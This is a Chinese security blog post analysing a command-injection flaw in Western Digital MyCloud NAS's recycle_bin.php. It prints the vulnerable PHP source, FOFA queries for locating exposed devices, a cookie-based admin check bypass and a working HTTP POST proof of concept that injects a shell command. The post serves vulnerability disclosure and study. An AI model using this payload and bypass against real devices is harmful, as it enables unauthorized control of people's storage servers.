---
title: "西部数码 NAS recycle_bin.php 命令执行漏洞"
source: https://mrxn.net/jswz/west-nas-recycle_bin-rce.html
asset_dir: assets/西部数码-nas-recycle_bin.php-命令执行漏洞
---

# 西部数码 NAS recycle\_bin.php 命令执行漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/9/2 16:26
- 540浏览
- [0评论](#comment)
- 23分钟阅读

深入探索

recycle\_bin

软件

分类回收桶

---

# 漏洞简介

Western Digital MyCloud NAS是一款网络附加存储设备，旨在提供集中存储和共享解决方案。它允许用户在家中或办公室通过网络访问文件，支持多种设备的备份和共享。Western Digital MyCloud NAS [recycle\_bin](#).php中存在[命令执行](https://mrxn.net/tag/rce)漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。

回收再利用

# 影响版本

<=2.11.153（老版本，已发布修复补丁）

# fofa语法

> icon\_hash="-1074357885" && header="X-Powered-By: PHP/5.4.16"
>
> body="\_PROJECT\_MODEL\_ID\_YOSEMITE " && body="\_PROJECT\_MODEL\_ID\_LIGHTNING "

# 漏洞分析

深入探索

Nessus

VPN服务

安全认证考试

直接看 `recycle_bin.php` 其业务实现逻辑如下

```
<?php
session_start();
$r = new stdClass();
$r->success = false;

include ("../lib/login_checker.php");

/* login_check() return 0: no login, 1: login, admin, 2: login, normal user */
if (login_check() != 1)
{
    echo json_encode($r);
    exit;
}

function get_xml_value_from_memory($node)
{
    $res = array();
    $cmd = sprintf("xmldbc -g %s ", $node);
    exec($cmd, $res);
    return $res;
}

function set_xml_value_to_memory($node, $val)
{
    $cmd = sprintf("xmldbc -s %s \"%s\"", $node, $val);
    pclose(popen($cmd, 'r'));
}

$action = $_POST['action'];

$r = new stdClass();
switch ($action)
{
    case "get_info":
    {
       $r->auto_clear = get_xml_value_from_memory("/recycle_bin/auto_clear")[0];
       $r->clear_days = get_xml_value_from_memory("/recycle_bin/day")[0];
       if ($r->clear_days == "") $r->clear_days = 1;

       $r->success = true;
       echo json_encode($r);
    }
       break;

    case "save":
    {
       set_xml_value_to_memory("/recycle_bin/auto_clear", $_POST["enable_auto_clear"]);
       set_xml_value_to_memory("/recycle_bin/day", $_POST["clear_days"]);

       pclose(popen("xmldbc -D /etc/NAS_CFG/config.xml", 'r'));
       pclose(popen("access_mtd \"cp -f /etc/NAS_CFG/config.xml /usr/local/config\"", 'r'));

       $r->success = true;
       echo json_encode($r);
    }
       break;
}
?>
```

当**action=save**时，POST参数`enable_auto_clear`和`clear_days`都是在未经过滤或校验的情况下直接传递进**set\_xml\_value\_to\_memory**方法当中的**$val**部分，再由`sprintf`格式化拼接到`cmd`中，最后由**popen**来执行拼接后的[命令](https://mrxn.net/tag/rce)。尽管此漏洞需要管理员权限才能触发，但可以结合`login_check`的权限绕过达到 RCE的效果。

漏洞预警服务

# 漏洞复现

> 或者如下cookie
>
> isAdmin=1;username=admin\" -s 1337 -c \"

```
POST /web/setting/recycle_bin.php HTTP/1.1
Host: west-nas.mrxn.net
X-Forwarded-For: 127.0.0.1
Cookie: isAdmin=1;username=admin
Content-Type: application/x-www-form-urlencoded

action=save&enable_auto_clear="`pwd>/var/www/t.png`"
```

[![西部数码 NAS recycle_bin.php 命令执行漏洞](images/img-001-7f7961d6d407.webp)](https://image.mrxn.net/5e2ecd7ae08d4939a03b067e3a8c866a.webp)

成功[执行命令](https://mrxn.net/tag/rce)并输出到测试文件

计算机驱动器和存储设备

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#php](https://mrxn.net/tag/php)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#rce](https://mrxn.net/tag/rce)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
